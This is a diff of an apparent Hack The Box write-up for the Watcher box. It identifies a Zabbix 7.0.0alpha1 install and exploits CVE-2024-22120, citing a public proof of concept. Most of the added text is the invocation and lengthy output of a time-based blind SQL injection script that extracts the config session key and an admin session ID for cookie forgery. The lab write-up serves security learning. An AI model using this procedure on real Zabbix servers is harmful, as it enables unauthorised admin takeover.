@@ -9,7 +9,7 @@ tags:
   - HTB
   - Linux
   - medium
-lastmod: 2026-03-24T08:41:32.572Z
+lastmod: 2026-03-27T07:12:31.883Z
 ---
 # Box Info
 
@@ -147,39 +147,204 @@ I noted that there is the option for `sign in as guest`
 
 ### Tech stack
 
-![Pasted image 20260323231740.png](/ob/Pasted%20image%2020260323231740.png)
+The HTTP response headers
 
-```
-php 
-Apache/2.4.52 (Ubuntu) Server at zabbix.watcher.vl Port 80
-```
+After running Nmap, here is the identified infrastructure:
 
-### watcher.vl
+{{< tech-stack >}}
 
-### Tech stack
+OS: Ubuntu Linux\
+Web Server: Apache/2.4.52\
+Language: PHP 8.1\
+Database: MySQL 8.0\
+Application: Zabbix
 
-### Web Recon 80
+{{< /tech-stack >}}
 
-### \[\[WebSite Directory BurteForce]]
+![Pasted image 20260327132445.png](/ob/Pasted%20image%2020260327132445.png)
 
-```
-```
+![Pasted image 20260323231656.png](/ob/Pasted%20image%2020260323231656.png)
 
-### \[\[Exploit-CVE]]  & \[\[Default 404 Pages]]
-
-```
-whatweb http://example.com to find the version
-```
-
-```
-curl https://example.com/404
-```
-
-### \[\[git recon]]
-
-```shell
-└─#  nmap -p 80 -sCV uat.curryroomhk.com
-                                                                    
-```
+I noted that there is the option for `sign in as guest`
 
 ***
+
+![Pasted image 20260327132323.png](/ob/Pasted%20image%2020260327132323.png)
+
+CMS Server is Zabbix 7.0.0alpha1
+
+[CVE-2024-22120](https://www.cvedetails.com/cve/CVE-2024-22120/)
+
+reference : W01fhcker\
+https://github.com/W01fh4cker/CVE-2024-22120-RCE
+
+https://support.zabbix.com/browse/ZBX-24505
+
+![Pasted image 20260327135251.png](/ob/Pasted%20image%2020260327135251.png)
+
+![Pasted image 20260327140040.png](/ob/Pasted%20image%2020260327140040.png)
+
+Extract any hostid available to this user (open Monitoring->Hosts, host id will be in response)
+
+t69c61c57a0f16586261005\
+![Pasted image 20260327135952.png](/ob/Pasted%20image%2020260327135952.png)
+
+```
+uv add --script zabbix_server_time_based_blind_sqli.py pwntools
+```
+
+```
+➜  watcher uv run  --script zabbix_server_time_based_blind_sqli.py  --ip 10.129.234.163 --hostid 10084 --sid e85607b598e315b362b7e06ce22126e6  | grep "(+)"  
+(+) Extracting Zabbix config session key...
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=0
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=00
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=0001
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=00010
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=000101
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=0001010
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=00010100
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=000101000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=0001010001
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=00010100010
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=000101000100
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=0001010001001
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=00010100010010
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=000101000100100
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=0001010001001000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=00010100010010000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=000101000100100001
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=0001010001001000010
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=00010100010010000100
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=000101000100100001001
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=0001010001001000010010
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=00010100010010000100100
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=000101000100100001001000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=0001010001001000010010000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=00010100010010000100100000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=000101000100100001001000000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=0001010001001000010010000000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=00010100010010000100100000000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=000101000100100001001000000000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=0001010001001000010010000000000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_key=00010100010010000100100000000000
+(+) config session_key=00010100010010000100100000000000
+(+) Extracting admin session_id...
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=1
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=11
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=110
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=1100
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=11000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=110000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=1100001
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=11000010
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=110000100
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=1100001000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=11000010001
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=110000100010
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=1100001000100
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=11000010001000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=110000100010001
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=1100001000100010
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=11000010001000100
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=110000100010001000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=1100001000100010000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=11000010001000100000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=110000100010001000000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=1100001000100010000000
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=11000010001000100000001
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=110000100010001000000010
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=1100001000100010000000101
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=11000010001000100000001011
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=110000100010001000000010111
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=1100001000100010000000101110
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=11000010001000100000001011100
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=110000100010001000000010111001
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=1100001000100010000000101110011
+(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
+(+) session_id=11000010001000100000001011100110
+(+) admin session_id=11000010001000100000001011100110
+(+) session_key=00010100010010000100100000000000, admin session_id=11000010001000100000001011100110. Now you can genereate admin zbx_cookie and sign it with session_key
+➜  watcher 
+
+```
